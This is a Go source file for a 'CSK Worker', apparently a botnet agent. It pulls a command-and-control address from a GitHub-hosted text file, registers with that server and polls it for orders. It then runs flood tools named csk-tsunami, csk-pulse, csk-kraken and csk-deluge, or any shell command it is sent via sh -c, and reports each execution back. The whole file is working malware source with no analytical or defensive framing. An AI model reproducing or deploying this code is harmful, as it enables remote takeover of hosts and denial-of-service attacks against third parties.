package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

const (
	CONFIG_URL      = "https://raw.githubusercontent.com/tenkhongvps1-ctrl/autocallport/refs/heads/main/port3.txt"
	CONFIG_INTERVAL = 30 * time.Second
	POLL_TIMEOUT    = 30 * time.Second
	HTTP_TIMEOUT    = 10 * time.Second
)

var configRegex = regexp.MustCompile(`cnc:\s*([^\s]+)\s+port:\s*(\d+)`)

// ==================== WORKER ====================

type Worker struct {
	id string

	configMu    sync.RWMutex
	currentHost string
	currentPort int
	baseURL     string

	httpClient *http.Client

	activeProcesses map[int]*exec.Cmd
	processMutex    sync.Mutex

	stopChan chan struct{}
}

func NewWorker() *Worker {
	// h2c client: HTTP/2 over plain TCP
	transport := &http2.Transport{
		AllowHTTP: true,
		DialTLSContext: func(ctx context.Context, network, addr string, cfg *tls.Config) (net.Conn, error) {
			var d net.Dialer
			return d.DialContext(ctx, network, addr)
		},
	}

	return &Worker{
		id:              generateWorkerID(),
		httpClient:      &http.Client{Transport: transport},
		activeProcesses: make(map[int]*exec.Cmd),
		stopChan:        make(chan struct{}),
	}
}

func generateWorkerID() string {
	host, _ := os.Hostname()
	if host == "" {
		host = "worker"
	}
	b := make([]byte, 4)
	rand.Read(b)
	return fmt.Sprintf("%s-%s", host, hex.EncodeToString(b))
}

// ==================== CONFIG FETCHER ====================

func (w *Worker) startConfigFetcher() {
	go func() {
		w.fetchAndUpdateConfig()

		ticker := time.NewTicker(CONFIG_INTERVAL)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				w.fetchAndUpdateConfig()
			case <-w.stopChan:
				log.Println("[Config] Fetcher stopped.")
				return
			}
		}
	}()
}

func (w *Worker) fetchAndUpdateConfig() {
	ctx, cancel := context.WithTimeout(context.Background(), HTTP_TIMEOUT)
	defer cancel()

	// Dùng http.DefaultClient cho config fetch (HTTP/1.1, không cần h2c)
	req, err := http.NewRequestWithContext(ctx, "GET", CONFIG_URL, nil)
	if err != nil {
		log.Printf("[Config] Request error: %v", err)
		return
	}
	req.Header.Set("User-Agent", "CSK-Worker/2.0")
	req.Header.Set("Cache-Control", "no-cache")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Printf("[Config] Fetch error: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("[Config] Bad status: %d", resp.StatusCode)
		return
	}

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	content := strings.TrimSpace(string(body))

	newHost, newPort, ok := parseConfig(content)
	if !ok {
		log.Printf("[Config] Invalid format: %q", content)
		return
	}

	w.configMu.Lock()
	changed := w.currentHost != newHost || w.currentPort != newPort
	if changed {
		log.Printf("[Config] Update: %s:%d -> %s:%d", w.currentHost, w.currentPort, newHost, newPort)
		w.currentHost = newHost
		w.currentPort = newPort
		w.baseURL = fmt.Sprintf("http://%s:%d", newHost, newPort)
	}
	w.configMu.Unlock()

	if changed {
		log.Printf("[Config] Base URL: %s", w.baseURL)
	}
}

func parseConfig(content string) (string, int, bool) {
	if m := configRegex.FindStringSubmatch(content); len(m) == 3 {
		p, err := strconv.Atoi(m[2])
		if err == nil && p > 0 && p <= 65535 {
			return m[1], p, true
		}
	}
	var host string
	var port int
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "cnc:") {
			host = strings.TrimSpace(strings.TrimPrefix(line, "cnc:"))
		} else if strings.HasPrefix(line, "port:") {
			p, err := strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(line, "port:")))
			if err == nil {
				port = p
			}
		}
	}
	if host != "" && port > 0 && port <= 65535 {
		return host, port, true
	}
	return "", 0, false
}

func (w *Worker) getBaseURL() string {
	w.configMu.RLock()
	defer w.configMu.RUnlock()
	return w.baseURL
}

// ==================== HTTP CLIENT METHODS ====================

func (w *Worker) register(baseURL string) error {
	url := fmt.Sprintf("%s/register?id=%s", baseURL, w.id)

	ctx, cancel := context.WithTimeout(context.Background(), HTTP_TIMEOUT)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "POST", url, nil)
	if err != nil {
		return err
	}
	resp, err := w.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("register status: %d", resp.StatusCode)
	}
	return nil
}

func (w *Worker) poll(baseURL string) (string, error) {
	url := fmt.Sprintf("%s/poll?id=%s", baseURL, w.id)

	// Timeout dài hơn server một chút để không bị client cancel trước server
	ctx, cancel := context.WithTimeout(context.Background(), POLL_TIMEOUT+10*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return "", err
	}

	resp, err := w.httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return "", nil // timeout, không có lệnh
	}
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("poll status: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(body)), nil
}

func (w *Worker) report(baseURL, msg string) {
	url := fmt.Sprintf("%s/report?id=%s", baseURL, w.id)

	ctx, cancel := context.WithTimeout(context.Background(), HTTP_TIMEOUT)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, "POST", url, bytes.NewBufferString(msg))
	if err != nil {
		return
	}
	resp, err := w.httpClient.Do(req)
	if err == nil {
		resp.Body.Close()
	}
}

// ==================== MAIN LOOP ====================

func (w *Worker) run() {
	log.Printf("[Worker] ID: %s", w.id)

	var lastBaseURL string

	for {
		select {
		case <-w.stopChan:
			return
		default:
		}

		baseURL := w.getBaseURL()
		if baseURL == "" {
			time.Sleep(2 * time.Second)
			continue
		}

		// Config đổi hoặc chưa register → register lại
		if baseURL != lastBaseURL {
			log.Printf("[Worker] Registering with %s...", baseURL)
			if err := w.register(baseURL); err != nil {
				log.Printf("[Worker] Register failed: %v", err)
				time.Sleep(5 * time.Second)
				continue
			}
			log.Printf("[Worker] Registered OK with %s", baseURL)
			lastBaseURL = baseURL
		}

		cmd, err := w.poll(baseURL)
		if err != nil {
			log.Printf("[Worker] Poll error: %v", err)
			time.Sleep(5 * time.Second)
			// Không reset lastBaseURL, sẽ thử register lại nếu vẫn lỗi
			continue
		}

		if cmd != "" {
			log.Printf("[Worker] Command: %s", cmd)
			w.executeCommand(cmd)
			w.report(baseURL, fmt.Sprintf("executed: %s", cmd))
		}
	}
}

// ==================== COMMAND EXECUTION ====================

func (w *Worker) executeCommand(command string) {
	if command == "" {
		return
	}

	if strings.HasPrefix(command, "stop") {
		w.handleStopCommand(command)
		return
	}

	parts := strings.Fields(command)
	if len(parts) == 0 {
		return
	}

	method := strings.ToLower(parts[0])
	args := parts[1:]

	var scriptToRun string
	var isExecutable bool

	switch method {
	case "csk-tsunami":
		scriptToRun = "flood.js"
	case "csk-pulse":
		scriptToRun = "./csk-pulse"
		isExecutable = true
	case "csk-kraken":
		scriptToRun = "./csk-kraken"
		isExecutable = true
	case "csk-deluge":
		scriptToRun = "./lid2hz"
		isExecutable = true
	default:
		// Shell command tùy ý (từ !cmd của telnet)
		log.Printf("[Worker] Shell: %s", command)
		go w.runShell(command)
		return
	}

	if _, err := os.Stat(scriptToRun); os.IsNotExist(err) {
		log.Println("Script not found:", scriptToRun)
		return
	}

	w.chmodAllInCwd()
	log.Printf("Executing: %s with args: %v", method, args)
	w.runScript(scriptToRun, args, isExecutable)
}

func (w *Worker) runShell(command string) {
	cmd := exec.Command("sh", "-c", command)
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil
	if err := cmd.Start(); err != nil {
		log.Printf("[Shell] Start error: %v", err)
		return
	}
	log.Printf("[Shell] PID %d", cmd.Process.Pid)
	cmd.Wait()
}

func (w *Worker) chmodAllInCwd() {
	entries, err := os.ReadDir(".")
	if err != nil {
		return
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		os.Chmod(e.Name(), 0755)
	}
}

func (w *Worker) handleStopCommand(command string) {
	parts := strings.Fields(command)
	if len(parts) < 2 {
		w.stopAllProcesses()
		return
	}
	log.Printf("Stop command: %s", parts[1])
	w.stopAllProcesses()
}

func (w *Worker) stopAllProcesses() {
	w.processMutex.Lock()
	defer w.processMutex.Unlock()

	for pid, cmd := range w.activeProcesses {
		if cmd.Process != nil {
			cmd.Process.Kill()
			log.Printf("Stopped PID: %d", pid)
		}
		delete(w.activeProcesses, pid)
	}
}

func (w *Worker) runScript(scriptToRun string, args []string, isExecutable bool) {
	var cmd *exec.Cmd

	if isExecutable {
		cmd = exec.Command(scriptToRun, args...)
	} else {
		cmdArgs := append([]string{scriptToRun}, args...)
		cmd = exec.Command("node", cmdArgs...)
	}

	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil

	if err := cmd.Start(); err != nil {
		log.Printf("Script start error: %v", err)
		return
	}

	pid := cmd.Process.Pid
	log.Printf("Started PID: %d", pid)

	w.processMutex.Lock()
	w.activeProcesses[pid] = cmd
	w.processMutex.Unlock()

	go func() {
		err := cmd.Wait()
		w.processMutex.Lock()
		delete(w.activeProcesses, pid)
		w.processMutex.Unlock()
		if err != nil {
			log.Printf("PID %d exited: %v", pid, err)
		} else {
			log.Printf("PID %d done", pid)
		}
	}()
}

// ==================== CLEANUP ====================

func (w *Worker) cleanup() {
	select {
	case <-w.stopChan:
	default:
		close(w.stopChan)
	}
	w.stopAllProcesses()
}

// ==================== MAIN ====================

func main() {
	log.Println("Starting CSK Worker (HTTP/2 h2c)...")

	worker := NewWorker()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		log.Println("Shutting down...")
		worker.cleanup()
		os.Exit(0)
	}()

	worker.startConfigFetcher()

	// Chờ config lần đầu (tối đa 10s)
	for i := 0; i < 50; i++ {
		if worker.getBaseURL() != "" {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}

	worker.run()
}
